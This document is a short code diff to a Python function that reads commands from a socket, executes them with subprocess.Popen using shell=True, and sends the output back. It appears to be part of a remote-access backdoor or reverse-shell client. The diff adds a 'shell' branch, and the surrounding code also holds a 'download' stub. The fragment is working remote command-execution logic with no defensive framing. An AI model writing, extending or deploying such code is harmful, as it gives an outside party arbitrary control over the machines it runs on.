@@ -63,11 +63,13 @@ def executa(socket):
                             dados = socket.recv(1024)
                             if(not dados or dados=='exit'):
                                 break
+                            if(dados == 'shell'):
+                                pass
                             else:
-                                print(dados)
                                 comando = subprocess.Popen(dados, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)    # CRIAR THREADS PARA RODAR PROGRAMAS -> NÃO TER QUE ESPERAR O PROGRAMA FECHAR
                                 retorno = comando.stdout.read() + comando.stderr.read()
                                 socket.send(retorno)
+                                
                     elif(dados=='download'):
                         pass
                 except:
